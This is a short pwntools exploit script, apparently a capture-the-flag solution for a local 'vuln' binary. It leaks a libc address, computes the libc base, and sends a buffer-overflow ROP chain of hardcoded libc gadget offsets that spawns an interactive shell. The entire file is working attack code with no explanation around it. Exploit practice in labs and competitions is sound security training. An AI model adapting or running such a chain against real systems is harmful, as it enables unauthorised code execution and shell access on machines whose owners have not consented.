from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = "debug"
context.terminal = ["qterminal", "-e"]
p=remote('localhost',33129)
#p = process("./vuln")
#gdb.attach(p,'b *$rebase(0x1238)')
p.sendline(b'a'*39)
addr2 = puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libcbase = addr2 - 0x29D90
payload2=b'a'*0x28+p64(libcbase+0x2a3e5)+p64(libcbase+0x1d8678)+p64(libcbase+0x50902)
p.sendline(payload2)

p.interactive()
